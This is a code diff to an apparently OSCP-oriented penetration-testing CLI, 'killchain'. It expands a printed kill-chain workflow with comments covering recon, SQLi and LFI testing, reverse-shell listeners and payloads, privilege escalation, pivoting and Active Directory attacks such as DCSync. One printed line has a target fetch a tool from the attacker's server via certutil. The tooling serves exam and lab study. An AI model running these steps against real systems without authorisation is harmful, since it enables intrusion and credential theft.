@@ -326,21 +326,58 @@ def cmd_workflow(args):
     print(f"\n  {BLD}{CYN}═══ OSCP Kill Chain Workflow ═══{RST}")
     print()
     steps = [
-        ("1. Setup",          f"killchain session set target {target}\n    killchain session auto"),
-        ("2. Recon",          f"killchain recon {target} -o ./recon/\n    killchain fruit {target}"),
-        ("3. Web",            f"killchain web http://{target}\n    killchain test sqli http://{target}/page?id=1\n    killchain lfi 'http://{target}/page?file=FUZZ'"),
-        ("4. Exploit Search", f"killchain xfind nmap ./recon/{target}.nmap"),
-        ("5. Shell",          f"killchain listen 4444             # start penelope listener\n    killchain shell -l bash -p 4444  # generate payload"),
-        ("6. PrivEsc (Lin)",  f"killchain pe  # then upload privesc.sh to target"),
-        ("7. PrivEsc (Win)",  f"killchain privesc cheatsheet -os windows"),
-        ("8. Pivot",          f"killchain pivot ligolo --agent-ip {target} --local-port 11601"),
-        ("9. AD",             f"killchain ad cheatsheet\n    killchain ad chain 'user>GenericAll>svc_sql>DCSync>{domain}'"),
-        ("10. Report",        f"killchain report add '{target}' {target}\n    killchain report flag {target} local\n    killchain report generate"),
+        ("1. Setup", "\n    ".join([
+            f"killchain session set target {target}   # save target IP — auto-fills every command below",
+            f"killchain session auto                  # auto-detect your tun0 VPN IP as attacker",
+        ])),
+        ("2. Recon", "\n    ".join([
+            f"killchain recon {target} -o ./recon/    # nmap full port scan + service enum → saves to ./recon/",
+            f"killchain fruit {target}                # quick-win checker: anon FTP, default creds, open shares, etc.",
+        ])),
+        ("3. Web  (if port 80/443 open)", "\n    ".join([
+            f"killchain web http://{target}                      # ffuf dir bust + tech fingerprint + header scan",
+            f"killchain test sqli http://{target}/page?id=1      # SQLi test with sqlmap",
+            f"killchain lfi 'http://{target}/page?file=FUZZ'     # LFI fuzzing with ffuf + wordlist",
+        ])),
+        ("4. Exploit Search", "\n    ".join([
+            f"killchain xfind nmap ./recon/{target}.nmap   # parse nmap output → searchsploit each service version",
+        ])),
+        ("5. Shell  (get a reverse shell)", "\n    ".join([
+            f"killchain listen 4444                    # start penelope listener on port 4444 (auto falls back to nc)",
+            f"killchain shell -l bash -p 4444          # generate copy-paste reverse shell payload for the target",
+        ])),
+        ("6. PrivEsc — Linux", "\n    ".join([
+            f"killchain pe                             # prints path to linpeas.sh — upload this to the target",
+            f"killchain privesc cheatsheet             # linpeas, sudo -l, SUID, cron, writable paths reference",
+        ])),
+        ("7. PrivEsc — Windows", "\n    ".join([
+            f"killchain privesc cheatsheet -os windows # winpeas, token abuse, SeImpersonate, service exploits reference",
+            f"# Serve tools: cd ~/oscp-tools && python3 -m http.server 8000",
+            f"# Target downloads: certutil -urlcache -f http://{attacker}:8000/winPEASx64.exe C:\\\\Windows\\\\Temp\\\\winpeas.exe",
+        ])),
+        ("8. Pivot  (reach internal network)", "\n    ".join([
+            f"killchain pivot ligolo \\",
+            f"  --attacker-ip {attacker} --pivot-ip {target} --internal-net 172.16.0.0/24",
+            f"# Outputs: proxy cmd (attacker) + agent.exe cmd (target) + route setup — copy-paste both sides",
+            f"# Tools: ligolo-ng proxy (attacker) + ligolo-ng agent (target)",
+        ])),
+        ("9. Active Directory", "\n    ".join([
+            f"killchain ad cheatsheet                                      # AS-REP, Kerberoast, PtH, DCSync reference",
+            f"killchain ad chain 'user>GenericAll>svc_sql>DCSync>{domain}'",
+            f"# Reads a BloodHound edge chain and outputs step-by-step exploit commands",
+            f"# Tools: bloodyAD (password reset), impacket secretsdump (DCSync), mimikatz (Windows)",
+        ])),
+        ("10. Report", "\n    ".join([
+            f"killchain report add '{target}' {target}   # register box in report",
+            f"killchain report flag {target} local        # log local.txt flag",
+            f"killchain report flag {target} proof        # log proof.txt flag",
+            f"killchain report generate                   # render Markdown → PDF with pandoc+xelatex",
+        ])),
     ]
     for title, cmd in steps:
         print(f"  {BLD}{YEL}{title}{RST}")
         for line in cmd.split("\n"):
-            print(f"    {CYN}{line}{RST}")
+            print(f"    {CYN}{line.lstrip()}{RST}")
         print()
     return 0
 
